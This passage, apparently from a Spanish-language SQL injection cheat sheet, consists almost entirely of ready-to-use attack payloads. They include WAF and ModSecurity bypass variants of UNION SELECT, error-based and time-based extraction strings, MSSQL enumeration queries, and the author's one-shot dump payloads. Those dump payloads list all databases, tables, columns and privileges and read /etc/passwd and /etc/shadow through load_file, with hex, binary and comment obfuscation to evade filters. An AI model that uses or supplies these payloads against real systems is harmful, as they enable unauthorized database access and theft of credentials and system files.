/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+'SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/^.*union.*$/ /^.*select.*$/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel="">+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+

```
### HTML URL Encode (Codificación Url)

```
union select:

u	= %75
n	= %6e
i	= %69
o	= %6f
n	= %6e
space	= %20
s	= %73
e	= %65
l	= %6c
c	= %63
t	= %74

```
### Sql payloads 

```
/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+

+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+

SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --

+uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+

%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)

+/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+

+div+@a:=(current_user/**_**/())+UNION/**/DISTINCTROW+SELECT+1,2,@a,4+--+

%75nion/**)!*/sele%63%74/**)!*/+1,2,3....

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--

+union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+

+union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+

```


## Inyecciónes sql usando funciones sql

### Sql inyection payload usando la función RPAD y SOUNDS LIKE 

`SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()`

### Sql inyection payload usando upper + reverse + right + sounds like para extraer información  

`select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()`

### Sql inyection usando elt, doble Reverse, hex y unhex

`Select unhex(hex(reverse(reverse(elt(1, table_Name))))) from information_schema.tables`

### Sql inyection case

```
SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables

SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables

SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
```

### Sql inyection case y sounds like

```
CASE table_type WHEN 'BASE Table' THEN table_name END from information_Schema.tables where table_schema sounds like schema()

```

### SQL IF Function

```
SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables

select IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
```

### SQL IFNULL

```
SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
```

### SQL NULLIF

```
SELECT NULLIF(table_name,2) from information_schema.tables
```

### Sql inyection payload usando upper + reverse + right + sounds like

`select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()`

### SQL injection usando doble reverse + right + if statement + HTML injection

`SELECT reverse(reverse(right(if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>'),100))) from information_schema.tables`

### Sql inyection usando las funciones HEX-UNHEX

`SELECT UNHEX(HEX(table_name))from information_schema.tables`

### Inyección sql tipo error based usando Extractvalue

`1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--`

### Sql inyection payload usando reverse

`reverse(right(reverse(data),1))`

### Sql inyection payload usando extractvalue

`extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))`

### Sql inyection payload + url encode + timing  

`-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)`

### JSON Generation Functions
```
select JSON_OBJECT(1, @@version)

select json_array(current_user())

select json_objectagg(1, @@datadir)

select json_arrayagg('_Y000!_')

```

## Mezclas

```
select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))

SELECT * FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'

SELECT IF(IFNULL(1/0,'a'),'NO',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'

select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)

select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables

SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables

select IF(IFNULL(0,'a'),'NO es nulo',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables

Select if(substring(@@version,'1','1') = "5", 'si', 'no')

Select Unhex(hex(WEIGHT_STRING(table_name))) as 'tables' from information_schema.tables where table_name regexp '^[a | b]'

select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables

select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)

SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables

SELECT version() FROM (SELECT(SLEEP(5))) a

SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a

SELECT TRIM(UpdateXML(CONCAT('.',database(),'--',(SELECT (ELT(1=1,@@version))),concat('--',@@datadir)), '_Y000_', '1111'))

SELECT * FROM (SELECT count(*), CONCAT((select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))), 0x23, FLOOR(RAND(0)*1)) AS x FROM information_schema.columns GROUP BY x) y

Select if(now()=sysdate(),(select table_name),0) from information_schema.tables

select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))

SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS Y000 FROM information_schema.tables GROUP BY Y000) x

```

## Sql inyection + dios sql

```
/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..

(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)

CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
```

### Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection

`+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+`

### sql inyection payload+ bypass Mod_Security 

```
/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...

/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--

/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+

/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)

%27+or%20.0union/**/distinctrow%23GearFourth%0aselect/**/distinctrow%20

```

### Sql inyection payload + dios + Mod_Security bypass

```
/*!50000%75%6e%69on*/ %73%65%6cect 1,cOncAT/**x**/(0b0010001000111110001011110011111000111100001011110110000100111110001011010010110100111110001111000110001001110010001111100011110001100010011100100011111000111100011100110111010001111001011011000110010100111110011101000111001000111010011011100111010001101000001011010110001101101000011010010110110001100100001010000110010101110110011001010110111000101001001000000111101100100000011000100110000101100011011010110110011101110010011011110111010101101110011001000010110101100011011011110110110001101111011100100011101000100000001000110110011000110010011001100011001001100110001100100011101101111101011101000110000101100010011011000110010101111011011101110110100101100100011101000110100000111010001101010011000001110000011110000011101101101111011101100110010101110010011001100110110001101111011101110011101001100001011101010111010001101111001110110111110100111100001011110111001101110100011110010110110001100101001111100011110001110100011000010110001001101100011001010011111000111100011000100011111001001101011011110110010001011111011100110110010101100011011101010111001001101001011101000111100100100000011000100111100101110000011000010111001101110011001000000110001001111001001000000100110001110101011010010111001100100000010011010110000101100100011001010111001001101111001000000010100001011111010110010011000000110000001100000010000101011111001010010011110000101111011000100011111000111100011000100111001000111110,user/**x**/(),0b00111100011000100111001000111110,dAtAbaSe/**x**/(),0b00111100011000100111001000111110,version/**x**/(),0b001111000110001001110010001111100011110001100010011100100011111000111100011101000111001000111110001111000111010001101000001111100101010001000001010000100100110001000101010100110011110000101111011101000110100000111110001111000111010001101000001111100100001101001111010011000101010101001101010011100101001100111100001011110111010001101000001111100011110000101111011101000111001000111110,(select(@x)/*!50000from/**8**/*/(/*!50000select/**8**/*/(@x:=0b00000000),(select(0)/*!From/**8**/*/(/*!50000information_schema.columns/**8**/*/)/*!50000where/**8**/*/(table_schema=database/**_**/())and(0b00000000)in(@x:=/*!50000coNcat/**8**/*/(@x,0b001111000111010001110010001111100011110001110100011001000011111000111100011001100110111101101110011101000010000001100011011011110110110001101111011100100011110101110010011001010110010000111110,/*!50000table_name/**8**/*/,0b00111100001011110110011001101111011011100111010000111110001111000010111101110100011001000011111000111100011101000110010000111110,/*!50000column_name/**8**/*/))))x)),3.4

```
### Sql inyection payload + comment + hex/unhex

`/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))`

### Sql databases and tables

```
/*!50000COnCaT/**8**/*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c703e5461626c6573203a203c2f703e,(select%20grouP_ConCat(/*!50000table_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.TabLes*/))


concat(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))


concat(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e5461626c61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
```

### Sql inyection payload + url encode 

`+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+`


## MSSQL

```
--           :     Comment Type 1
--+          :     Comment Type 2
--+-         :     SQL Comment
/**/         :     Inline Comment
;%00         :     Null Byte

@@version    :     Current Version
user_name()  :     Current User
user         :     Current User
db_name()    :     Current Database
@@SERVERNAME :     Hostname

Tables

union select table_name from (select top 1 table_name from information_schema.tables order by 1) as 1 order by 1 desc--

Columns

union select column_name from (select top 1 column_name from information_schema.columns where table_name='table' order by 1) as 1 order by 1 desc--

Dump info

union select culumn form table--

```

## Xpath injection

```

+and extractvalue(0x0a,concat(0x0a,(select version())))

+and updatexml(null,concat(0x0a,(select version())),null)

+and extractvalue(0x0a,concat(0x0a,(select database())))

+and updatexml(null,concat(0x0a,(select database())),null)

+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))

+and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)

+and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x6e6f6d627265 limit 0,1)))

+and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x6e6f6d627265 limit 0,1)),null)

+and extractvalue(0x0a,concat(0x0a,(select concat(columna) from tabla limit 0,1)))

+and updatexml(null,concat(0x0a,(select concat(columna) from tabla limit 0,1)),null)


```

## Error based

```
Version:
+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1

Database():
+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)

Tablas:
+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x7461626c65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)

Columnas:
+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x636f6c756d6e61+AND+table_schema=0x7461626c65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)

Extraer información:
+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(columna+AS+CHAR),0x7e))+FROM+table+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)


```

## IA test waf bypass

```
uNion%20sElECt%20%2F*%21%20dAtaBaSE()%20*%2F%2b--%2b

```

## Personal 

Dios-Oneshot personal

V1 cuenta con:

- Verision de base de datos
- Hostname
- Privilegios
- Cuenta y enumeracion de todas las bases de datos
- Cuenta y enumeracion de todas las tablas de la base de datos
  actual con sus respectivas columnas

```
/*!50000cOnCat*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)*/+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c613e546f74616c204261736573206465206461746f733a203c2f613e,0x3c62723e,(SELECT+count(/*!50000cOnCat*/(schema_name))+FROM+INFORMATION_SCHEMA.schemata),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e42617365206465206461746f73207574696c697a6164613a203c2f613e,0x3c62723e,database(),0x3c62723e,0x3c62723e,0x3c613e4e756d65726f206465207461626c61733a203c2f613e,0x3c62723e,(SELECT+count(CONCAT(table_name))+FROM+INFORMATION_SCHEMA.tables+where+table_schema=database()),0x3c62723e,0x3c62723e,0x3c613e5461626c617320792073757320636f6c756d6e61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))

```
V1.5 cuenta con:

- Verision de base de datos
- Hostname
- Privilegios
- Cuenta y enumeracion de todas las bases de datos
- Cuenta y enumeracion de todas las tablas de la base de datos
  actual con sus respectivas columnas
- Se implementó la función IFNULL para pasar a local fire read si es que se tienen los permisos 


```
/*!50000cOnCat*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e4469726563746f72696f20696e7374616c63696f6e2062617365206465206461746f733a203c2f613e,@@datadir,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)*/+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c613e4c69737461206465207573756172696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000IFNULL(group_concat(grantee,privilege_type,is_grantable,0x3c62723e),'NO CUENTAS CON PERMISOS')*/+FROM information_schema.user_privileges WHERE privilege_type = 'SUPER'),0x3c62723e,0x3c62723e,0x3c613e546f74616c204261736573206465206461746f733a203c2f613e,0x3c62723e,(SELECT+count(/*!50000cOnCat*/(schema_name))+FROM+INFORMATION_SCHEMA.schemata),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e42617365206465206461746f73207574696c697a6164613a203c2f613e,0x3c62723e,database(),0x3c62723e,0x3c62723e,0x3c613e4e756d65726f206465207461626c61733a203c2f613e,0x3c62723e,(SELECT+count(CONCAT(table_name))+FROM+INFORMATION_SCHEMA.tables+where+table_schema=database()),0x3c62723e,0x3c62723e,0x3c613e5461626c617320792073757320636f6c756d6e61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x),0x3c62723e,0x3c62723e,0x3c613e4c6f63616c2066696c65207265616420284c696e7578293a203c2f613e,0x3c62723e,0x3c62723e,0x3c613e2f6574632f7061737377643a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/passwd')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f736861646f773a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/shadow')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f67726f75703a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/group')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f686f7374733a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/hosts')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f6f732d72656c656173653a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/os-release')),'NO CUENTAS CON PERMISOS')))

```
V1.5 adaptado para bypassear algunos waf, cuenta con:

- Verision de base de datos
- Hostname
- Privilegios
- Cuenta y enumeracion de todas las bases de datos
- Cuenta y enumeracion de todas las tablas de la base de datos
  actual con sus respectivas columnas
- Se implementó la función IFNULL para pasar a local fire read si es que se tienen los permisos

Codificaciones usadas:

- Hexadecimal
- Binario
- Comentarios SQL
- URL
- Mayúscula y minúscula

```
/*!50000COnCaT*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,/*!50000@@VerSion*/,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,/*!50000@@hOstName*/,0x3c62723e,0x3c62723e,0x3c613e4469726563746f72696f20696e7374616c63696f6e2062617365206465206461746f733a203c2f613e,/*!50000@@DatAdir*/,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SelecT*/%20/*!50000grouP_conCat(GRANTEE,0x202d3e20,IS_GRANTABLE)*/+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.USEr_PRiVIleGES*/),0x3c62723e,0x3c62723e,0b0011110001100001001111100101010101110011011101010110000101110010011010010110111101110011001000000110001101101111011011100010000001110000011001010111001001101101011010010111001101101111011100110010000001110010011011110110111101110100001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000IfNuLL(/*!50000grouP_conCat(grantee,privilege_type,is_grantable,0x3c62723e),%27NO%20CUENTAS%20CON%20PERMISOS%27)*/+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.USEr_PRiVIleGES*/%20/*!50000WHERe%20/**8**/*/+/*!50000privilege_type/**8**/*/%20=%20%27SUPER%27),0x3c62723e,0x3c62723e,0b001111000110000100111110010011100111010101101101001011100010000001100010011000010111001101100101001000000110010001100101001000000110010001100001011101000110111101110011001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000CoUnT(/*!50000COnCaT*/(/*!50000schema_name/**8**/*/)/**8**/)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/)/**8**/,0x3c62723e,0x3c62723e,0b0011110001100001001111100110001001100001011100110110010101110011001000000110010001100101001000000110010001100001011101000110111101110011001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000grouP_conCat(/*!50000schema_name/**8**/*/,0x3c62723e)/**8**/+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0b00111100011000010011111001001110011101010110110100101110001000000110001001100001011100110110010100100000011001000110010100100000011101000110000101100010011011000110000101110011001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000CoUnT(/*!50000COnCaT*/(/*!50000table_name/**8**/*/))+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.tabLes*/+/*!50000wHerE*/+/*!50000table_schema*/=/*!50000databAse/**8**/()*//**/),0x3c62723e,(/*!50000SelecT*/(@x)/*!50000fRom/**8**/*/(/*!50000SelecT*/(@x:=0x00),(/*!50000SelecT*/(0)/*!50000fRom/**8**/*/(/*!50000iNfoRmAtiOn_sChEmA/**_**/.cOlumNs*/)/*!50000where/**8**/*/(/*!50000table_schema*/=/*!50000databAse/**8**/()*//**/)/*!50000and*/(0x00)in(@x:=/*!50000COnCaT*/+(@x,0x3c62723e,/*!50000tablE_name*/,0x203a3a20,/*!50000columN_name*/))))x),0x3c62723e,0x3c62723e,0b001111000110000100111110010011000110111101100011011000010110110000100000011001100110100101101100011001010010000001110010011001010110000101100100001110100010000000111100001011110110000100111110,0x3c62723e,0x3c62723e,0b0011110001100001001111100010111101100101011101000110001100101111011100000110000101110011011100110111011101100100001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f706173737764)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b001011110110010101110100011000110010111101110011011010000110000101100100011011110111011100111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f736861646f77)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b0010111101100101011101000110001100101111011001110111001001101111011101010111000000111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f67726f7570)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b0010111101100101011101000110001100101111011010000110111101110011011101000111001100111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f686f737473)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b00101111011001010111010001100011001011110110111101110011001011010111001001100101011011000110010101100001011100110110010100111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f6f732d72656c65617365)),'NO CUENTAS CON PERMISOS')))

```
